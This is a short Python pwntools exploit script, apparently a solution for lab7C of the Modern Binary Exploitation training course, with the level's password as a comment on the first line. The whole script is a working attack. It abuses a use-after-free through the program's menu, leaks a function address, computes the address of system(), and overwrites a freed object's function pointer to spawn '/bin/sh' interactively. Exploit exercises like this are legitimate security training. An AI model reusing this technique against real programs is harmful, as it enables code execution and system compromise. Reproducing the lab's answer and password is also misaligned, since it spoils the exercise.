# PASS: us3_4ft3r_fr33s_4re_s1ck
from pwn import *
import re

SYSTEM_OFF = 0x37E625C9

ADDR_REGEX = re.compile(r"[0-9]{7,}")
PATH = "/home/kamil/Projects/MBE/MBE_release/levels/lab07/lab7C"

p = process([PATH])
log.info(util.proc.pidof(p))

p.sendline("2")
p.sendline("65535")

p.sendline("4")

p.sendline("1")
p.sendline("/bin/sh")

p.sendline("6")
out = p.recv()
p.sendline("1")
leak = p.recvall(timeout=1)

leaked_short_str = int(re.findall(ADDR_REGEX, leak)[0])
log.info("Leaked short_str() address: %s" % str(hex(leaked_short_str)))
system = leaked_short_str + SYSTEM_OFF
log.info("system() address: %s" % str(hex(system)))

p.sendline("3")

p.sendline("2")
p.sendline(str(system))

p.sendline("5")
p.sendline("1")
p.interactive()
